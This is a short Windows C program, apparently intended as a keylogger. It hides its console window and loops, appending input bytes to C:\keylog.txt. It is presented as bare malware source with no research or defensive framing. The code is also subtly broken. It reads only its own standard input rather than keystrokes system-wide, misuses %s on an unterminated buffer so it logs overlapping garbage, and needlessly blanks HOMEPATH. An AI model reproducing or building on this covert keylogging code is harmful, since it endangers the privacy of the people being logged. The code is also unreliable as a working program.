#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define BUFFER_SIZE 1024

void HideConsoleWindow()
{
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
}

DWORD WriteKeyToFile(char* character)
{
    FILE* fPtr;
    char filePath[] = "C:\\keylog.txt";

    // Open file in append mode.
    fPtr = fopen(filePath, "a");

    if (fPtr == NULL) {
        printf("Error opening file!\n");
        exit(1);
    }

    fprintf(fPtr, "%s", character);
    fclose(fPtr);

    return 0;
}

int main() 
{
    SetEnvironmentVariableA("HOMEPATH", "");
    HideConsoleWindow();

    while (1) {

        char buffer[BUFFER_SIZE];
        DWORD bytesRead;

        int result = ReadFile(
            GetStdHandle(STD_INPUT_HANDLE),      // handle to open input object
            buffer,                              // pointer to the buffer to receive data
            BUFFER_SIZE,                         // number of bytes to be read by function
            &bytesRead,                          // pointer to variable that receives amount of data returned
            NULL                                 // not used with console objects
        );

        if (!result) {
            return 1;
        }

        for (int i = 0; i < bytesRead; ++i) {
            WriteKeyToFile(buffer + i);
        }
    }

    return 0;
}